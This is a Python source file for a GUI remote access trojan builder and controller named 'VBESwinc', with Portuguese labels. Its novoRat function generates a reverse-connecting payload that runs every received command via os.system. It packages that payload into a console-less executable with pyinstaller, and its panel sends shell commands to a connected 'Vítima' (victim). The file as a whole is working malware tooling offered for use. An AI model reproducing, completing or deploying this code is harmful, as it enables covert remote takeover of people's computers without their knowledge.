
from pathlib import Path
from PySimpleGUI import PySimpleGUI as sg
import os
from subprocess import Popen
import socket
import keyboard
import time
import automatizacao

ipPadrao = socket.gethostbyname(socket.gethostname())
portaPadrao = 8081
madeBy = 'VBESwinc'
version = '1.0'


####### PÁG INICIAL #######

def inicial(client=None, client_addr=None):
    sg.theme('Dark')
    sg.theme_button_color(('white', 'grey'))

    

    layout = [
        [sg.Text(madeBy, font="verdana")],
        [sg.Text('v'+version)],
        [sg.Text('')],
        [sg.Text('')],
        [sg.Text('Features')],
        [sg.Text('')],
        [sg.Button('RAT', key='btnRat', size=(10, 1)), sg.Button('Automatização', key='btnAuto', size=(15,1))],

    ]

    

    janela = sg.Window(''+ madeBy +' '+ version, layout, size=(700, 400), finalize=True)
    
    
    
    while True:
        
        eventos, valores = janela.read()
        
        if eventos == sg.WINDOW_CLOSED:
            exit()

        if eventos == 'btnRat':
            conectado()
        if eventos == 'btnAuto':
            automatizacao.autoInit()
        



####### JANELA CONECTAR #########

sg.theme('DarkBlack')
sg.theme_button_color(('white', '#9700FF'))


def init(janelaOld):
    layout = [
        [sg.Text('Host')],
        [sg.Input(ipPadrao, key='host')],
        [sg.Text('Porta')],
        [sg.Input(portaPadrao, key='porta')],
        [sg.Button('Conectar', key='btnConn', size=(40,1), pad=(6,15))]
    ]

    janela = sg.Window(''+ madeBy +' '+ version +' - Conectar', layout, size=(300,180))

    while True:
        eventos, valores = janela.read()
        if eventos == sg.WINDOW_CLOSED:
            break
        
        if eventos == 'btnConn':
            host = valores['host']
            porta = valores['porta']
            janelaOld.close()
            conectar(host, porta, janela)






####### SOCKET ##########
def conectar(host, porta, janelaOld):
    porta = int(porta)
    server = socket.socket()
    server.bind((host, porta))
    server.listen(2)
    client, client_addr = server.accept()
    sg.popup("Uma nova conexão foi estabelecida!")
    janelaOld.close()
    conectado(client, client_addr, server)
    
                    
def conectado(client=None, client_addr=None, server=None):
    sg.theme('DarkBlack')
    sg.theme_button_color(('white', '#9700FF'))

    menu = [
        ['&RAT', ['&Conectar', '&Novo']],
        ['&Opções', ['&CMD', '&Chat']],
        ['&Ajuda', ['&GitHub', '&Discord']]
    ]

    layout = [
        [sg.Menu(menu, tearoff=False, key='menu')],
        [sg.Text('Conectado com: '+str(client_addr))],

    ]

    

    janela = sg.Window(''+ madeBy +' '+ version +' - RAT', layout, size=(400, 50), finalize=True)
    
    
    
    while True:
        
        eventos, valores = janela.read()
        
        if eventos == sg.WINDOW_CLOSED:
            break

        if eventos == 'CMD':
            cmd(client, client_addr, janela)
        
        if eventos == 'Chat':
            chat(client, client_addr, janela, server)
        
        if eventos == 'Novo':
            rat(client, client_addr, janela)

        if eventos == 'Conectar':
            init(janela)


def rat(client=None, client_addr=None,janela=None):
    sg.theme('DarkBlack')
    sg.theme_button_color(('white', '#9700FF'))
    
    layout = [
        [sg.Text('Criar RAT')],
        [sg.Text('')],
        [sg.Text('Host', size=(18,1)), sg.Text('Porta', size=(17,1))],
        [sg.Input(ipPadrao, key='inpRatHost', size=(20,2)), sg.Input(portaPadrao, key='inpRatPorta', size=(20,2))],        
        [sg.Text('Nome')],
        [sg.Input(key='inpRatNome', size=(42,2))],
        [sg.Text('')],
        [sg.Button('Criar', key='btnRat')]
    ]

    janelaRat = sg.Window(''+ madeBy +' ' + version + ' - Criar RAT', layout, finalize=True)

    while True:
        event, val = janelaRat.read()
        if event == sg.WIN_CLOSED:
            janelaRat.close()
            janela.close()
            conectado(client, client_addr)
        if event == 'btnRat':
            host = val['inpRatHost']
            porta = val['inpRatPorta']
            nome = val['inpRatNome']
            janelaRat.close()
            novoRat(host, porta, nome)
            

def novoRat(host, porta, nome):
    with open(nome + '.py', "w") as arquivo:
        arquivo.write('import socket\nimport subprocess\nimport os\n\nHOST=socket.gethostbyname("'+ host +'")\nPORT='+ porta +'\n\nclient = socket.socket()\nclient.connect((HOST, PORT))\n\nwhile True:\n    command = client.recv(1024)\n    command = command.decode()\n    os.system(command)')
        command = "pyinstaller --onefile --noconsole "+nome+".py"
        Popen(command, shell=True)
        #time.sleep(1)
        #os.system("start cmd")
        #time.sleep(1)
        #keyboard.write("pyinstaller --onefile "+nome+".py")
        #keyboard.send("enter")
        sg.popup("Seu RAT será processado!\nEm alguns instantes estará disponível\nNa pasta 'dist' na raíz!")
      
        
        
        


#OPCOES RAT#
def cmd(client, client_addr, janela):
    sg.theme('DarkBlack')
    sg.theme_button_color(('white', '#9700FF'))
    
    layout = [
        [sg.Text('Prompt de Comando')],
        [sg.Text('')],
        [sg.Input(key='inpCmd', size=(50,2))],
        [sg.Text('')],
        [sg.Button('Enviar', key='btnEnvCmd')]
    ]

    janelaCmd = sg.Window(''+ madeBy +' ' + version + ' - Prompt de Comando', layout, size=(230,150), finalize=True)

    while True:
        event, val = janelaCmd.read()
        if event == sg.WIN_CLOSED:
            janelaCmd.close()
            janela.close()
            conectado(client, client_addr)
        if event == 'btnEnvCmd':
            command = str(val['inpCmd'])
            command = command +" cmdOpc"
            while True:
                command = command.encode()
                client.send(command)
                sg.popup("Enviado!")
                janelaCmd.close()
                janela.close()
                conectado(client, client_addr)


def chat(client, client_addr, janela, server):
    sg.theme('DarkBlack')
    sg.theme_button_color(('white', '#9700FF'))
    
    layout = [
        [sg.Text('Chat')],
        [sg.Text('')],
        [sg.Text('Indisponível no momento')],
    ]

    janelaCmd = sg.Window(''+ madeBy +' ' + version + ' - Chat', layout, size=(230,150), finalize=True)

    while True:
        event, val = janelaCmd.read()
        if event == sg.WIN_CLOSED:
            janelaCmd.close()
            janela.close()
            conectado(client, client_addr)
        if event == 'btnEnvCmd':
            janelaCmd.close()
            janela.close()
            command = input("Você: ")
            command = command +" chatOpc"
            print(command)
            while command != "quit":
                command = command.encode()
                client.send(command)
                response = client.recv(1024).decode()
                print("Vítima: "+response)
                

            
    
    
    
    
inicial()